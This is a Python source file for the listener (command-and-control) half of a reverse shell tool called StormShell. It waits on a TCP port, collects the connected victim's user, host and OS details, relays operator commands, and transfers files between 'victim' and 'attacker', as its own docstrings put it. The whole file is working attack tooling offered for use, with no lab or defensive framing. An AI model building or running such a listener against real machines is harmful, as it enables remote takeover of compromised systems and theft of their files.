"""
StormShell - Listener Module

A lightweight TCP socket listener that accepts incoming reverse shell
connections.  After a client connects, the listener receives system
information (username, hostname, OS) and enters an interactive command
loop with a dynamic prompt.  Supports file download (victim → attacker)
and file upload (attacker → victim) via a size-prefixed binary transfer
protocol.  When a session ends, the listener re-enters listening mode
to accept new connections.
"""

import logging
import os
import socket
import sys

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
BUFFER_SIZE = 4096   # Max bytes to receive per recv() call
HEADER_SIZE = 16     # Fixed-length header carrying the file size in bytes

# ---------------------------------------------------------------------------
# Logger configuration
# ---------------------------------------------------------------------------
logger = logging.getLogger("stormshell.listener")


class Listener:
    """
    TCP socket listener that binds to a given host and port, waits for
    inbound connections, and enters an interactive command loop to
    exchange data with the connected agent.  Displays a dynamic prompt
    enriched with the target's username, hostname, and OS information.

    After a session ends (agent disconnects or operator types 'exit'),
    the listener returns to listening mode for new connections.

    Attributes:
        host (str):   IP address to bind the listener to.
        port (int):   TCP port number to listen on.
        server (socket.socket | None): The server socket instance.
        client (socket.socket | None): The accepted client socket instance.
        client_address (tuple | None):  (ip, port) of the connected client.
        target_info (str): Formatted target info for the CLI prompt.
    """

    def __init__(self, host: str = "127.0.0.1", port: int = 4444) -> None:
        """
        Initialize the Listener with the target host and port.

        Args:
            host: The IP address on which the listener will bind.
            port: The TCP port number on which the listener will bind.
        """
        self.host: str = host
        self.port: int = port
        self.server: socket.socket | None = None
        self.client: socket.socket | None = None
        self.client_address: tuple | None = None
        self.target_info: str = ""

    # ------------------------------------------------------------------
    # Socket lifecycle
    # ------------------------------------------------------------------

    def _create_server_socket(self) -> None:
        """
        Create a TCP server socket and configure it for immediate address
        reuse via SO_REUSEADDR.  This prevents 'Address already in use'
        errors when restarting the listener quickly.
        """
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        logger.debug("Server socket created with SO_REUSEADDR enabled.")

    def _bind_and_listen(self) -> None:
        """
        Bind the server socket to the configured host/port and start
        listening for incoming connections.

        Raises:
            OSError: If the address is already in use or permission is denied.
        """
        try:
            self.server.bind((self.host, self.port))
            self.server.listen(1)
            logger.info(
                "Listening on %s:%d — waiting for incoming connections …",
                self.host,
                self.port,
            )
            print(f"\n[*] Listening on {self.host}:{self.port} ...")
        except PermissionError:
            logger.error(
                "Permission denied: cannot bind to %s:%d. "
                "Try a port above 1024 or run with elevated privileges.",
                self.host,
                self.port,
            )
            print(
                f"[!] Permission denied: cannot bind to "
                f"{self.host}:{self.port}. Try a port > 1024."
            )
            self._cleanup()
            sys.exit(1)
        except OSError as exc:
            logger.error(
                "Failed to bind to %s:%d — %s",
                self.host,
                self.port,
                exc,
            )
            print(f"[!] Socket error: {exc}")
            self._cleanup()
            sys.exit(1)

    def _accept_connection(self) -> None:
        """
        Block until a client connects, then store the client socket and
        its address for later use.
        """
        try:
            self.client, self.client_address = self.server.accept()
            logger.info(
                "Connection received from %s:%d",
                self.client_address[0],
                self.client_address[1],
            )
            print(
                f"\n[+] Connection received from "
                f"{self.client_address[0]}:{self.client_address[1]}"
            )
        except OSError as exc:
            logger.error("Failed to accept connection — %s", exc)
            print(f"[!] Accept error: {exc}")
            self._cleanup()
            sys.exit(1)

    # ------------------------------------------------------------------
    # System info handshake
    # ------------------------------------------------------------------

    def _receive_system_info(self) -> None:
        """
        Receive the agent's system information as the first packet after
        a connection is established.

        Expected payload format (UTF-8 string):
            ``<username>@<hostname>|<os_info>``

        Parses the payload and builds ``self.target_info`` which is used
        to render a dynamic CLI prompt.  On failure, falls back to a
        generic prompt label.
        """
        try:
            data = self.client.recv(BUFFER_SIZE)
            if not data:
                logger.warning("No system info received from agent.")
                self.target_info = "unknown@unknown"
                return

            info_str = data.decode("utf-8", errors="replace").strip()
            logger.info("Agent system info: %s", info_str)

            # Parse "user@host|OS" format.
            if "|" in info_str:
                identity, os_info = info_str.split("|", 1)
            else:
                identity = info_str
                os_info = "Unknown OS"

            self.target_info = f"{identity} ({os_info})"

            print(f"[+] Target: {self.target_info}")

        except (ConnectionResetError, OSError) as exc:
            logger.error("Failed to receive system info — %s", exc)
            self.target_info = "unknown@unknown"

    # ------------------------------------------------------------------
    # Network helpers
    # ------------------------------------------------------------------

    def _recv_exact(self, length: int) -> bytes:
        """
        Receive exactly *length* bytes from the client socket.

        Needed because TCP is a stream protocol — a single recv() may
        return fewer bytes than requested.  This method loops until the
        full payload has been assembled.

        Args:
            length: Number of bytes to receive.

        Returns:
            The complete byte string of the requested length.

        Raises:
            ConnectionError: If the remote end disconnects before the
                             full payload is received.
        """
        data = b""
        while len(data) < length:
            chunk = self.client.recv(min(BUFFER_SIZE, length - len(data)))
            if not chunk:
                raise ConnectionError("Connection closed during transfer.")
            data += chunk
        return data

    # ------------------------------------------------------------------
    # File transfer handlers
    # ------------------------------------------------------------------

    def _handle_download(self, remote_path: str) -> bool:
        """
        Download a file from the agent (victim → attacker).

        Protocol:
            1. Listener sends ``download <path>`` (already done by caller).
            2. Agent responds with a 16-byte size header.
               - If the header starts with ``ERROR:`` the rest is an error
                 message; print it and return.
            3. Agent streams the file data in BUFFER_SIZE chunks.
            4. Listener writes the received data to a local file.

        Args:
            remote_path: Path on the agent's filesystem to download.

        Returns:
            True if the loop should continue, False if connection broke.
        """
        try:
            # --- Receive size header ---
            header = self._recv_exact(HEADER_SIZE)
            header_str = header.decode("utf-8").strip()

            # Check for agent-side errors (file not found, etc.).
            if header_str.startswith("ERROR:"):
                error_data = self._recv_exact(int(header_str.split(":")[1]))
                print(error_data.decode("utf-8", errors="replace"))
                return True

            file_size = int(header_str)
            if file_size == 0:
                print("[!] Remote file is empty (0 bytes).")
                return True

            # --- Receive file data ---
            file_data = self._recv_exact(file_size)

            # Save to the current directory using the basename of the
            # remote path to avoid path-traversal issues.
            local_name = os.path.basename(remote_path)
            with open(local_name, "wb") as fp:
                fp.write(file_data)

            print(
                f"[+] Downloaded '{remote_path}' → '{local_name}' "
                f"({file_size:,} bytes)"
            )
            logger.info(
                "Downloaded %s (%d bytes) → %s",
                remote_path, file_size, local_name,
            )
            return True

        except (ConnectionError, OSError) as exc:
            print(f"[!] Download failed — {exc}")
            logger.error("Download failed — %s", exc)
            return False
        except (ValueError, IndexError) as exc:
            print(f"[!] Invalid download header — {exc}")
            logger.error("Invalid download header — %s", exc)
            return False

    def _handle_upload(self, local_path: str) -> bool:
        """
        Upload a file from the attacker to the agent (attacker → victim).

        Protocol:
            1. Listener sends ``upload <path>`` (already done by caller).
            2. Agent replies with ``READY`` acknowledgement.
            3. Listener sends a 16-byte size header followed by file data
               in BUFFER_SIZE chunks.
            4. Agent writes the received data and sends a confirmation.

        Args:
            local_path: Path on the attacker's local filesystem to upload.

        Returns:
            True if the loop should continue, False if connection broke.
        """
        # --- Validate local file ---
        if not os.path.isfile(local_path):
            print(f"[!] Local file not found: {local_path}")
            # Notify the agent so it doesn't hang waiting for data.
            try:
                self.client.sendall(b"UPLOAD_CANCEL")
            except OSError:
                pass
            return True

        try:
            # --- Wait for agent READY signal ---
            ready_signal = self.client.recv(BUFFER_SIZE)
            if not ready_signal:
                print("[!] Agent disconnected before upload.")
                return False

            signal_text = ready_signal.decode("utf-8", errors="replace").strip()
            if signal_text != "READY":
                print(f"[!] Unexpected agent response: {signal_text}")
                return True

            # --- Read file and send ---
            with open(local_path, "rb") as fp:
                file_data = fp.read()

            file_size = len(file_data)
            header = str(file_size).zfill(HEADER_SIZE).encode("utf-8")
            self.client.sendall(header)

            # Send in chunks to avoid overwhelming the socket buffer.
            for offset in range(0, file_size, BUFFER_SIZE):
                self.client.sendall(file_data[offset:offset + BUFFER_SIZE])

            # --- Receive agent confirmation ---
            confirmation = self.client.recv(BUFFER_SIZE)
            if confirmation:
                print(confirmation.decode("utf-8", errors="replace"))
            else:
                print("[!] Agent disconnected after upload.")
                return False

            logger.info(
                "Uploaded %s (%d bytes) to agent.", local_path, file_size
            )
            return True

        except (ConnectionError, OSError) as exc:
            print(f"[!] Upload failed — {exc}")
            logger.error("Upload failed — %s", exc)
            return False

    # ------------------------------------------------------------------
    # Interactive command loop
    # ------------------------------------------------------------------

    def _interactive_loop(self) -> None:
        """
        Enter an interactive command loop after a connection has been
        established.  The operator types commands which are sent to the
        agent; the agent's response is then printed to the console.

        Special commands:
            exit                — Shut down the agent and close the session.
            download <path>     — Download a file from the agent.
            upload <local_path> — Upload a local file to the agent.
        """
        prompt = f"[{self.target_info}] StormShell> " if self.target_info else "StormShell> "

        print("[*] Interactive session started. Type 'exit' to quit.\n")
        logger.info("Interactive command loop started.")

        while True:
            try:
                command = input(prompt).strip()
            except (EOFError, KeyboardInterrupt):
                # Operator pressed Ctrl+C or Ctrl+D at the prompt.
                print("\n[!] Interrupt received. Ending session …")
                logger.warning("Operator interrupted the command prompt.")
                try:
                    self.client.sendall(b"exit")
                except OSError:
                    pass
                break

            # Ignore empty input — just re-display the prompt.
            if not command:
                continue

            # --- Send the command to the agent ---
            try:
                self.client.sendall(command.encode("utf-8"))
                logger.debug("Sent command: %s", command)
            except (BrokenPipeError, ConnectionResetError, OSError) as exc:
                print(f"[!] Failed to send command — {exc}")
                logger.error("Send failed — %s", exc)
                break

            # If the operator typed 'exit', stop after sending it.
            if command.lower() == "exit":
                print("[*] Exit command sent. Closing session …")
                logger.info("Exit command sent to agent.")
                break

            # --- Handle file transfer commands locally ---
            lower = command.lower()

            if lower.startswith("download "):
                remote_path = command.split(" ", 1)[1].strip()
                if not self._handle_download(remote_path):
                    break
                continue

            if lower.startswith("upload "):
                local_path = command.split(" ", 1)[1].strip()
                if not self._handle_upload(local_path):
                    break
                continue

            # --- Receive the agent's response (normal command) ---
            try:
                response = self.client.recv(BUFFER_SIZE)
                if not response:
                    print("[!] Agent disconnected.")
                    logger.warning("Agent sent empty response (disconnected).")
                    break
                print(response.decode("utf-8", errors="replace"))
            except (ConnectionResetError, OSError) as exc:
                print(f"[!] Connection lost — {exc}")
                logger.error("Receive failed — %s", exc)
                break

        logger.info("Interactive command loop ended.")

    # ------------------------------------------------------------------
    # Cleanup helpers
    # ------------------------------------------------------------------

    def _close_client(self) -> None:
        """Gracefully close the client socket if it exists."""
        if self.client:
            try:
                self.client.shutdown(socket.SHUT_RDWR)
            except OSError:
                # Socket may already be disconnected — ignore.
                pass
            finally:
                self.client.close()
                self.client = None
                logger.debug("Client socket closed.")

    def _close_server(self) -> None:
        """Gracefully close the server socket if it exists."""
        if self.server:
            try:
                self.server.shutdown(socket.SHUT_RDWR)
            except OSError:
                # Server socket may not be connected — ignore.
                pass
            finally:
                self.server.close()
                self.server = None
                logger.debug("Server socket closed.")

    def _cleanup(self) -> None:
        """Close all open sockets in the correct order."""
        self._close_client()
        self._close_server()

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def start(self) -> None:
        """
        Full listener lifecycle with connection re-listening.

        Flow:
            1. Create server socket, bind, and listen.
            2. Accept a connection and receive system info.
            3. Enter interactive command loop.
            4. When the session ends:
               - If operator sent 'exit' → shut down completely.
               - If agent disconnected → close client, re-listen.
            5. KeyboardInterrupt at any point → full shutdown.
        """
        try:
            self._create_server_socket()
            self._bind_and_listen()

            while True:
                self._accept_connection()
                self._receive_system_info()
                self._interactive_loop()

                # Close the client socket but keep the server socket
                # alive so we can accept new connections.
                self._close_client()
                self.target_info = ""

                print("\n[*] Session ended. Waiting for new connection ...")
                logger.info("Session ended. Re-listening for connections.")

        except KeyboardInterrupt:
            print("\n[!] Keyboard interrupt received. Shutting down …")
            logger.warning("Keyboard interrupt — shutting down.")

        finally:
            self._cleanup()
            print("[*] All sockets closed. Exiting.\n")
            logger.info("All sockets closed. Listener exited.")
